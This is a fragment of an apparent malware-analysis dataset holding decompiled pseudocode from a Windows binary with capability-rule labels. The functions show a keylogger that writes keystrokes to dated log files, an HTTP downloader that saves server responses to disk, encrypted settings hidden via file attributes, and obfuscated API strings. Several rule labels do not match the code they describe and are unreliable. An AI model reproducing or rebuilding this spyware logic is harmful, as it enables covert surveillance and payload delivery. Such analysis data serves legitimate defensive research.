        "decompiled_code": "\nuchar fcn.0040cfcb(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    uchar auStack1136 [264];\n    uchar auStack872 [68];\n    uchar auStack804 [8];\n    uchar auStack796 [260];\n    uchar auStack536 [508];\n    int32_t iStack28;\n    uchar uStack21;\n    uchar uStack13;\n    int32_t iStack4;\n    \n    uStack13 = 0;\n    cVar1 = fcn.0040af4f(auStack536, 0x204);\n    if (cVar1 == '\\x01') {\n        fcn.00419fa8(auStack796, 0x104, 0x41ee3a, auStack536, \"Settings.ini\");\n        cVar1 = fcn.0040aa34(auStack796);\n        if (cVar1 != '\\0') {\n            sub.KERNEL32.dll_SetFileAttributesA(auStack796, 0x80);\n        }\n        iStack28 = sub.msvcrt.dll_fopen(auStack804, 0x41ed59);\n        if (iStack28 != 0) {\n            fcn.0041a59f(iStack4 + 4, 0, 0x20);\n            fcn.00419918(iStack4 + 4, unaff_retaddr, 0x20);\n            fcn.004165ec(auStack1136, 0x41ecdc, 0x10);\n            fcn.004166e1(auStack1136, iStack4, 0x44, auStack872, 0x44);\n            iVar2 = sub.msvcrt.dll_fwrite(auStack872, 1, 0x44, iStack28);\n            uStack21 = iVar2 == 0x44;\n            sub.msvcrt.dll_fclose(iStack28);\n        }\n        cVar1 = fcn.0040aa34(auStack804);\n        if (cVar1 != '\\0') {\n            sub.KERNEL32.dll_SetFileAttributesA(auStack804, 6);\n        }\n    }\n    else {\n        uStack21 = 0;\n    }\n    return uStack21;\n}\n",
        "token_count": 494
    },
    "0040d1a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040d1a4(int32_t param_1, uint param_2)\n\n{\n    uchar uStack549;\n    uchar uStack548;\n    uchar uStack547;\n    uchar uStack546;\n    uchar uStack545;\n    uchar uStack544;\n    uchar uStack543;\n    uchar uStack542;\n    uchar uStack541;\n    uchar uStack540;\n    uchar uStack539;\n    uchar uStack538;\n    uchar uStack537;\n    uchar uStack536;\n    uchar uStack535;\n    uchar uStack534;\n    uchar uStack533;\n    uchar uStack532;\n    uchar uStack531;\n    uchar uStack530;\n    uchar uStack529;\n    uchar auStack528 [512];\n    int32_t iStack16;\n    \n    if (0 < *(param_1 + 0x618)) {\n        uStack549 = 0x25;\n        uStack548 = 100;\n        uStack547 = 7;\n        uStack546 = 0x25;\n        uStack545 = 100;\n        uStack544 = 7;\n        uStack543 = 0x68;\n        uStack542 = 0x74;\n        uStack541 = 0x74;\n        uStack540 = 0x70;\n        uStack539 = 0x3a;\n        uStack538 = 0x2f;\n        uStack537 = 0x2f;\n        uStack536 = 0x25;\n        uStack535 = 0x73;\n        uStack534 = 0x25;\n        uStack533 = 0x73;\n        uStack532 = 7;\n        uStack531 = 0x25;\n        uStack530 = 0x73;\n        uStack529 = 0;\n        iStack16 = fcn.00419fa8(auStack528, 0x200, &uStack549, *(param_1 + 0x614), param_2, param_1 + 0x204, param_1, \n                                param_1 + 0x408);\n        if (0 < iStack16) {\n            fcn.00408b8f(*(param_1 + 0x618), 0xc4, auStack528, iStack16);\n        }\n    }\n    return;\n}\n",
        "token_count": 499
    },
    "0040d2de": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuchar fcn.0040d2de(void)\n\n{\n    uint *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t **ppiVar7;\n    uint uStack60;\n    int32_t iStack56;\n    char *pcStack52;\n    int32_t aiStack48 [2];\n    int32_t aiStack40 [4];\n    uint uStack24;\n    int32_t iStack20;\n    char *pcStack16;\n    int32_t aiStack12 [2];\n    int32_t iStack4;\n    \n    iStack4 = 0x40d2e8;\n    iVar3 = fcn.0041ce38();\n    iVar3 = -iVar3;\n    iVar5 = *0x424464 + 1;\n    *(*(&stack0x00001060 + iVar3) + 0x614) = *0x424464;\n    *0x424464 = iVar5;\n    *(&stack0x00001034 + iVar3) = 0xffffffff;\n    *(&stack0x00000004 + iVar3) = 0;\n    *(&stack0x00000000 + iVar3) = *(&stack0x00001060 + iVar3);\n    *(&stack0xfffffffc + iVar3) = 0x40d327;\n    fcn.0040d1a4();\n    *(&stack0x00000008 + iVar3) = 0;\n    *(&stack0x00000004 + iVar3) = 1;\n    *(&stack0x00000000 + iVar3) = 2;\n    *(&stack0xfffffffc + iVar3) = 0x40d343;\n    uVar4 = sub.WS2_32.dll_socket();\n    *(&stack0x00001028 + iVar3) = uVar4;\n    (&stack0x0000103f)[iVar3] = 0;\n    uVar4 = *(*(&stack0x00001054 + iVar3) + 0x610);\n    *(&stack0xfffffffc + iVar3) = &stack0x00001018 + iVar3;\n    *(&stack0xfffffff8 + iVar3) = uVar4;\n    *(&stack0xfffffff4 + iVar3) = *(&stack0x00001054 + iVar3) + 0x204;\n    *(&stack0xfffffff0 + iVar3) = 0x40d386;\n    cVar2 = fcn.00407c90();\n    if (cVar2 == '\\x01') {\n        *(&stack0xfffffffc + iVar3) = 0x10;\n        *(&stack0xfffffff8 + iVar3) = &stack0x00001018 + iVar3;\n        *(&stack0xfffffff4 + iVar3) = *(&stack0x00001028 + iVar3);\n        *(&stack0xfffffff0 + iVar3) = 0x40d3bf;\n        iVar5 = sub.WS2_32.dll_connect();\n        if (iVar5 < 0) {\n            *(&stack0x00001034 + iVar3) = 2;\n            ppiVar7 = &stack0xffffffe8 + iVar3;\n        }\n        else {\n            *(&stack0xfffffff8 + iVar3) = *(&stack0x00001048 + iVar3) + 0x204;\n            *(&stack0xfffffff4 + iVar3) = *(&stack0x00001048 + iVar3);\n            *(&stack0xfffffff0 + iVar3) =\n                 \"GET %s HTTP/1.1\\r\\nHost: %s \\r\\nUser-Agent: Mozilla/4.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.8\\r\\nConnection: close\\r\\n\\r\\n\"\n            ;\n            *(&stack0xffffffec + iVar3) = 0x1000;\n            *(&stack0xffffffe8 + iVar3) = &stack0x0000000c + iVar3;\n            *(&stack0xffffffe4 + iVar3) = 0x40d40e;\n            uVar4 = fcn.00419fa8();\n            *(&stack0x0000102c + iVar3) = uVar4;\n            *(&stack0xfffffff4 + iVar3) = 0;\n            *(&stack0xfffffff0 + iVar3) = *(&stack0x0000102c + iVar3);\n            *(&stack0xffffffec + iVar3) = &stack0x0000000c + iVar3;\n            *(&stack0xffffffe8 + iVar3) = *(&stack0x0000101c + iVar3);\n            *(&stack0xffffffe4 + iVar3) = 0x40d43f;\n            iVar5 = sub.WS2_32.dll_send();\n            if (iVar5 == *(&stack0x0000101c + iVar3)) {\n                *(&stack0xffffffe0 + iVar3) = 0x1000;\n                *(&stack0xffffffdc + iVar3) = 0;\n                *(&stack0xffffffd8 + iVar3) = &stack0xfffffffc + iVar3;\n                *(&stack0xffffffd4 + iVar3) = 0x40d477;\n                fcn.0041a59f();\n                *(&stack0xffffffe4 + iVar3) = 0;\n                *(&stack0xffffffe0 + iVar3) = 0x1000;\n                *(&stack0xffffffdc + iVar3) = &stack0xfffffffc + iVar3;\n                *(&stack0xffffffd8 + iVar3) = *(&stack0x0000100c + iVar3);\n                *(&stack0xffffffd4 + iVar3) = 0x40d49e;\n                uVar4 = sub.WS2_32.dll_recv();\n                ppiVar7 = &stack0xffffffc8 + iVar3;\n                *(&stack0x00001008 + iVar3) = uVar4;\n                if (*(&stack0x00001008 + iVar3) == 0) {\n                    *(&stack0x00001014 + iVar3) = 5;\n                    ppiVar7 = &stack0xffffffc8 + iVar3;\n                }\n                else {\n                    if (*(&stack0x00001008 + iVar3) == 0x1000) {\n                        (&stack0xffffffeb)[*(&stack0x00001008 + iVar3) + iVar3] = 0;\n                    }\n                    *(&stack0xffffffd0 + iVar3) = &stack0xffffffec + iVar3;\n                    *(&stack0xffffffcc + iVar3) = \"200 OK\";\n                    *(&stack0xffffffc8 + iVar3) = 0;\n                    *(&stack0xffffffc4 + iVar3) = 0x40d4fa;\n                    iVar5 = fcn.00419b7e();\n                    if (iVar5 == -1) {\n                        *(&stack0x00001014 + iVar3) = 5;\n                        ppiVar7 = &stack0xffffffc8 + iVar3;\n                    }\n                    else {\n                        *(&stack0xffffffd0 + iVar3) = &stack0xffffffec + iVar3;\n                        *(&stack0xffffffcc + iVar3) = \"\\r\\n\\r\\n\";\n                        *(&stack0xffffffc8 + iVar3) = 0;\n                        *(&stack0xffffffc4 + iVar3) = 0x40d52b;\n                        uVar4 = fcn.00419b7e();\n                        *(&stack0x00001004 + iVar3) = uVar4;\n                        if (*(&stack0x00001004 + iVar3) == -1) {\n                            *(&stack0x00001014 + iVar3) = 5;\n                            ppiVar7 = &stack0xffffffc8 + iVar3;\n                        }\n                        else {\n                            *(&stack0x00001004 + iVar3) = *(&stack0x00001004 + iVar3) + 4;\n                            *(&stack0xffffffcc + iVar3) = 0x41ef45;\n                            *(&stack0xffffffc8 + iVar3) = *(&stack0x00001028 + iVar3) + 0x408;\n                            *(&stack0xffffffc4 + iVar3) = 0x40d579;\n                            uVar4 = sub.msvcrt.dll_fopen();\n                            *(&stack0x00001000 + iVar3) = uVar4;\n                            if (*(&stack0x00001000 + iVar3) == 0) {\n                                *(&stack0x00001014 + iVar3) = 3;\n                            }\n                            else {\n                                *(&stack0xffffffd4 + iVar3) = *(&stack0x00001000 + iVar3);\n                                *(&stack0xffffffd0 + iVar3) = *(&stack0x00001008 + iVar3) - *(&stack0x00001004 + iVar3);\n                                *(&stack0xffffffcc + iVar3) = 1;\n                                *(&stack0xffffffc8 + iVar3) = &stack0xffffffec + *(&stack0x00001004 + iVar3) + iVar3;\n                                *(&stack0xffffffc4 + iVar3) = 0x40d5cc;\n                                sub.msvcrt.dll_fwrite();\n                                puVar1 = &stack0xffffffc8 + iVar3;\n                                do {\n                                    puVar6 = puVar1;\n                                    puVar6[3] = 0;\n                                    puVar6[2] = 0x1000;\n                                    puVar6[1] = puVar6 + 9;\n                                    *puVar6 = puVar6[0x40d];\n                                    puVar6[-1] = 0x40d647;\n                                    uVar4 = sub.WS2_32.dll_recv();\n                                    ppiVar7 = puVar6 + -4;\n                                    puVar6[0x40c] = uVar4;\n                                    if (puVar6[0x40c] == 0) {\n                                        puVar6[-4] = puVar6[0x40a];\n                                        puVar6[-5] = 0x40d66e;\n                                        sub.msvcrt.dll_fclose();\n                                        if (*(puVar6[0x414] + 0x60c) != '\\0') {\n                                            puVar6[-2] = 1;\n                                            puVar6[-3] = 0x41ef48;\n                                            puVar6[-4] = puVar6[0x414] + 0x408;\n                                            puVar6[-5] = 0x40d6a4;\n                                            fcn.0040a8af();\n                                        }\n                                        puVar6[0x40f] = 6;\n                                        *(puVar6 + 0x103b) = 1;\n                                        ppiVar7 = puVar6 + -4;\n                                        goto code_r0x0040d6c4;\n                                    }\n                                    puVar6[-1] = puVar6[0x40a];\n                                    puVar6[-2] = puVar6[0x40c];\n                                    puVar6[-3] = 1;\n                                    puVar6[-4] = puVar6 + 5;\n                                    puVar6[-5] = 0x40d5f8;\n                                    iVar3 = sub.msvcrt.dll_fwrite();\n                                    puVar1 = puVar6 + -4;\n                                } while (iVar3 == puVar6[0x40c]);\n                                puVar6[-4] = puVar6[0x40a];\n                                puVar6[-5] = 0x40d610;\n                                sub.msvcrt.dll_fclose();\n                                puVar6[0x40f] = 4;\n                            }\n                        }\n                    }\n                }\n            }\n            else {\n                *(&stack0x00001024 + iVar3) = 2;\n                ppiVar7 = &stack0xffffffd8 + iVar3;\n            }\n        }\n    }\n    else {\n        *(&stack0x00001040 + iVar3) = 1;\n        ppiVar7 = &stack0xfffffff4 + iVar3;\n    }\ncode_r0x0040d6c4:\n    ppiVar7[1] = ppiVar7[0x413];\n    *ppiVar7 = ppiVar7[0x418];\n    ppiVar7[-1] = 0x40d6de;\n    fcn.0040d1a4();\n    *ppiVar7 = ppiVar7 + 0x418;\n    ppiVar7[-1] = 0x40d6ed;\n    fcn.0040b4bf();\n    *ppiVar7 = ppiVar7 + 0x40d;\n    ppiVar7[-1] = 0x40d6fc;\n    fcn.00408d8a();\n    return *(ppiVar7 + 0x104b);\n}\n",
        "token_count": 2903
    },
    "0040d74c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040d74c(uint param_1, uint param_2, uchar param_3)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint unaff_EDI;\n    int32_t unaff_retaddr;\n    ushort uStack1108;\n    ushort uStack1106;\n    ushort uStack1102;\n    ushort uStack1100;\n    ushort uStack1098;\n    ushort uStack1096;\n    uchar auStack1092 [12];\n    char cStack1080;\n    char cStack1076;\n    uchar uStack1072;\n    uchar auStack1068 [8];\n    ushort uStack1060;\n    ushort uStack1058;\n    uchar auStack1056 [2];\n    uint16_t uStack1054;\n    uint uStack68;\n    \n    uStack1072 = param_3;\n    if ((*0x41e7c0 == 1) || (*0x41e7c0 != 0)) {\n        return 0xffffffff;\n    }\n    sub.KERNEL32.dll_GetLocalTime(auStack1056);\n    if ((uStack1054 != *0x4245a4) && (cStack1076 != '\\x01')) {\n        *0x4245a4 = uStack1054;\n        fcn.00419fa8(0x4244a0, 0x104, \"%s%.2d-%.2d-%.4d\", 0x41e720, uStack1054, uStack1058, uStack1060);\n        if (*0x41e7c4 != -1) {\n            sub.KERNEL32.dll_CloseHandle(*0x41e7c4);\n        }\n        *0x41e7c4 = -1;\n    }\n    if (cStack1080 != '\\0') {\n        if (*0x41e7c4 != -1) {\n            sub.KERNEL32.dll_CloseHandle(*0x41e7c4);\n        }\n        fcn.0040a9af(0x4244a0);\n        *0x41e7c4 = -1;\n        *0x424480 = 0;\n    }\n    if (*0x41e7c4 == -1) {\n        *0x424480 = 0;\n        cVar1 = fcn.0040aa6f(0x41e720);\n        if (cVar1 != '\\x01') {\n            fcn.0040ace1(0x41e720);\n        }\n        *0x41e7c4 = sub.KERNEL32.dll_CreateFileA(0x4244a0, 0x40000000, 1, 0, 4, 0x80, 0);\n        if (*0x41e7c4 == -1) {\n            *0x41e7c0 = 1;\n            return 0;\n        }\n        sub.KERNEL32.dll_SetFilePointer(*0x41e7c4, 0, 0, 2);\n        uStack68 = fcn.00419fa8(auStack1092, 0x400, \"\\r\\n\\r\\n[Log Started] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\\r\\n\", \n                                uStack1102, uStack1106, uStack1108, uStack1100, uStack1098, uStack1096);\n        fcn.0040d74c(auStack1092, uStack68, 0);\n    }\n    if (unaff_retaddr < 1) {\n        return 0;\n    }\n    fcn.0040d70c(unaff_EDI, unaff_retaddr);\n    uVar2 = sub.KERNEL32.dll_WriteFile(*0x41e7c4, unaff_EDI, unaff_retaddr, auStack1068, 0);\n    return uVar2;\n}\n",
        "token_count": 855
    },
    "0040db3b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040db3b(void)\n\n{\n    uint8_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint uStack412;\n    uint32_t uStack408;\n    uint uStack404;\n    char *pcStack400;\n    uchar *puStack396;\n    uint uStack392;\n    uint uStack388;\n    uint uStack384;\n    uint uStack380;\n    uchar auStack370 [6];\n    uchar auStack364 [4];\n    uchar auStack360 [56];\n    uchar auStack304 [12];\n    uchar auStack292 [200];\n    int32_t iStack92;\n    int32_t iStack88;\n    int32_t iStack72;\n    uint32_t uStack68;\n    uint uStack44;\n    uint uStack36;\n    uint32_t uStack24;\n    uint uStack16;\n    \n    uStack16 = 0;\n    uStack380 = 0x12;\n    uStack384 = 0x40db59;\n    iVar2 = sub.USER32.dll_GetKeyState();\n    uStack24 = iVar2 & 0x8000;\n    uStack384 = 0x14;\n    uStack388 = 0x40db75;\n    sub.USER32.dll_GetKeyState();\n    uStack388 = 0x91;\n    uStack392 = 0x40db84;\n    sub.USER32.dll_GetKeyState();\n    uStack392 = 0x90;\n    puStack396 = 0x40db93;\n    sub.USER32.dll_GetKeyState();\n    puStack396 = &stack0xfffffedc;\n    pcStack400 = 0x40dba2;\n    sub.USER32.dll_GetKeyboardState();\n    // switch table (138 cases) at 0x41f08c\n    switch(uStack16) {\n    case 8:\n        pcStack400 = \"[cCYw6sCYd]\";\n        uStack404 = 0x40dbcf;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40dbe7;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 9:\n        pcStack400 = \"[qCV]\";\n        uStack404 = 0x40dc2f;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40dc47;\n        uStack36 = fcn.00419fa8();\n        break;\n    default:\n        puStack396 = NULL;\n        pcStack400 = uStack16;\n        uStack404 = 0x40df3a;\n        uStack404 = sub.USER32.dll_MapVirtualKeyA();\n        uStack392 = 0;\n        puStack396 = &stack0xfffffe8e;\n        pcStack400 = &stack0xfffffed0;\n        uStack408 = uStack24;\n        uStack412 = 0x40df68;\n        iVar4 = sub.USER32.dll_ToAscii();\n        if (iVar4 == 1) {\n            uVar3 = sub.USER32.dll_GetKeyState(0x11);\n            uVar1 = puStack396 >> 0x10;\n            if ((uVar3 < 2) || (iStack72 != 0)) {\n                uStack68 = fcn.00419fa8(&stack0xfffffe78, 0x20, 0x41f082, uVar1);\n            }\n            else {\n                uVar5 = fcn.0040b60e(\"[P50i+%Y]\");\n                uStack68 = fcn.00419fa8(&stack0xfffffe78, 0x20, uVar5, uVar1 + 0x40);\n            }\n        }\n        else {\n            iVar4 = sub.USER32.dll_MapVirtualKeyA(uStack44, 0);\n            iVar4 = sub.USER32.dll_GetKeyNameTextA(iVar4 << 0x10, &stack0xfffffe94, 0x20);\n            if (0 < iVar4) {\n                uVar3 = sub.USER32.dll_GetKeyState(0x11);\n                if ((((uVar3 < 2) || (iStack92 != 0)) || (uStack68 < 0x30)) || (0x39 < uStack68)) {\n                    iStack88 = fcn.00419fa8(&stack0xfffffe64, 0x20, \"[%s]\", &stack0xfffffe84);\n                }\n                else {\n                    uVar6 = uStack68 & 0xff;\n                    uVar5 = fcn.0040b60e(\"[P50i+%Y]\");\n                    iStack88 = fcn.00419fa8(&stack0xfffffe64, 0x20, uVar5, uVar6);\n                }\n            }\n        }\n        break;\n    case 0xd:\n        pcStack400 = \"[jR5d0]\";\n        uStack404 = 0x40dbff;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40dc17;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x10:\n    case 0x11:\n    case 0x12:\n        break;\n    case 0x13:\n        pcStack400 = \"[c0dCw]\";\n        uStack404 = 0x40dddf;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40ddf7;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x14:\n        pcStack400 = \"[PCs6 mWYw]\";\n        uStack404 = 0x40decf;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40dee7;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x1b:\n        pcStack400 = \"[j6Y]\";\n        uStack404 = 0x40deff;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40df17;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x21:\n        pcStack400 = \"[9Cnd us]\";\n        uStack404 = 0x40dd4f;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40dd67;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x22:\n        pcStack400 = \"[9Cnd aWgR]\";\n        uStack404 = 0x40dd7f;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40dd97;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x23:\n        pcStack400 = \"[jRS]\";\n        uStack404 = 0x40ddaf;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40ddc7;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x24:\n        pcStack400 = \"[-Wld]\";\n        uStack404 = 0x40dd1f;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40dd37;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x25:\n        pcStack400 = \"[D00Wg md85]\";\n        uStack404 = 0x40dc5f;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40dc77;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x26:\n        pcStack400 = \"[D00Wg us]\";\n        uStack404 = 0x40dc8f;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40dca7;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x27:\n        pcStack400 = \"[D00Wg r4nI5]\";\n        uStack404 = 0x40dcbf;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40dcd7;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x28:\n        pcStack400 = \"[D00Wg aWgR]\";\n        uStack404 = 0x40dcef;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40dd07;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x2c:\n        pcStack400 = \"[904R5 MY0ddR]\";\n        uStack404 = 0x40de6f;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40de87;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x2d:\n        pcStack400 = \"[XR6d05]\";\n        uStack404 = 0x40de3f;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40de57;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x2e:\n        pcStack400 = \"[adid5d]\";\n        uStack404 = 0x40de0f;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40de27;\n        uStack36 = fcn.00419fa8();\n        break;\n    case 0x91:\n        pcStack400 = \"[MY0Wii mWYw]\";\n        uStack404 = 0x40de9f;\n        uStack392 = fcn.0040b60e();\n        puStack396 = 0x20;\n        pcStack400 = &stack0xfffffe98;\n        uStack404 = 0x40deb7;\n        uStack36 = fcn.00419fa8();\n    }\n    if (0 < iStack88) {\n        fcn.0040da18();\n        iVar4 = fcn.0040d74c(&stack0xfffffe64, iStack88, 0);\n        if (iVar4 == 0) {\n            *0x41e7c0 = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 2756
    },
    "0040e4f3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040e4f3(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uchar auStack540 [516];\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iStack24 = 0;\n    cVar1 = fcn.0040b97c(0x40);\n    if (cVar1 != '\\0') {\n        fcn.00419fa8(auStack540, 0x204, 0x41f2e7, 0x41e720, param_2);\n        iStack16 = fcn.0040b30c(auStack540, 0, &iStack24);\n        if ((iStack16 != 0) && (0 < iStack24)) {\n            iStack20 = sub.msvcrt.dll_malloc(0x230);\n            *(iStack20 + 0x208) = 0;\n            *(iStack20 + 0x20c) = 0xd0;\n            *(iStack20 + 0x20d) = 0xd1;\n            *(iStack20 + 0x20e) = 0xd2;\n            *(iStack20 + 0x204) = iStack16;\n            *(iStack20 + 0x218) = iStack24;\n            *(iStack20 + 0x21c) = iStack24 >> 0x1f;\n            *(iStack20 + 0x220) = 0;\n            *(iStack20 + 0x224) = 0;\n            *(iStack20 + 0x210) = param_1;\n            fcn.0040b2ab(0x41c150, iStack20);\n            return;\n        }\n    }\n    fcn.00408b8f(param_1, 0xd2, 0, 0);\n    return;\n}\n",
        "token_count": 422
    },
    "0040ebb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040ebb8(uint param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    ushort uStack644;\n    ushort uStack642;\n    ushort uStack638;\n    ushort uStack636;\n    ushort uStack634;\n    ushort uStack632;\n    int32_t iStack620;\n    uint32_t uStack616;\n    int32_t iStack612;\n    uint auStack608 [2];\n    int32_t iStack600;\n    uchar auStack596 [16];\n    uchar auStack580 [500];\n    int32_t iStack80;\n    code *pcStack76;\n    int32_t iStack72;\n    code *pcStack68;\n    uint uStack64;\n    uint32_t uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    int32_t iStack40;\n    uint uStack24;\n    \n    cVar1 = fcn.004195d4(auStack580, 0x8000);\n    if (cVar1 == '\\x01') {\n        uVar2 = fcn.0040b60e(\"MdYQ0Nh.Sii\");\n        iStack40 = sub.KERNEL32.dll_LoadLibraryA(uVar2);\n        if (iStack40 != 0) {\n            uVar2 = fcn.0040b60e(\"m6CEd5mWnWRMd664WRaC5C\");\n            uStack52 = sub.KERNEL32.dll_GetProcAddress(iStack40, uVar2);\n            uVar2 = fcn.0040b60e(\"m6C_0ddrd5Q0RcQ88d0\");\n            uStack64 = sub.KERNEL32.dll_GetProcAddress(uStack48, uVar2);\n            uVar2 = fcn.0040b60e(\"m6CjRQld0C5dmWnWRMd664WR6\");\n            pcStack76 = sub.KERNEL32.dll_GetProcAddress(uStack56, uVar2);\n            if (((pcStack68 != NULL) && (iStack72 != 0)) && (pcStack76 != NULL)) {\n                iVar3 = (*pcStack76)(&uStack616, &iStack612);\n                if (iVar3 == 0) {\n                    for (uStack60 = 0; uStack60 < uStack616; uStack60 = uStack60 + 1) {\n                        iVar3 = (*pcStack68)(iStack612, &iStack620);\n                        if (iVar3 == 0) {\n                            iStack620 = *(iStack612 + 0x30);\n                            uStack616 = *(iStack612 + 0x34);\n                            sub.KERNEL32.dll_FileTimeToSystemTime(uStack56, &uStack636);\n                            iStack80 = fcn.00419fa8(auStack596, 0x204, uStack56, *(iStack620 + 0x24), \n                                                    *(iStack620 + 0x10), *(iStack620 + 0x18), *(iStack620 + 0x20), \n                                                    uStack638, uStack642, uStack644, uStack636, uStack634, uStack632, \n                                                    *(iStack620 + 0x3c));\n                            if (iStack80 != -1) {\n                                fcn.0041972e(auStack608, auStack596);\n                            }\n                        }\n                        iStack612 = iStack612 + 8;\n                    }\n                }\n            }\n        }\n        if (iStack600 == 0) {\n            fcn.00408b8f(uStack24, 0xbd, 0, 0);\n        }\n        else {\n            uVar2 = fcn.00419910(auStack608);\n            fcn.00408b8f(uStack24, 0xbc, auStack608[0], uVar2);\n        }\n        fcn.00419639(auStack608);\n    }\n    else {\n        fcn.00408b8f(param_1, 0xbd, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 896
    },
    "0040f034": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
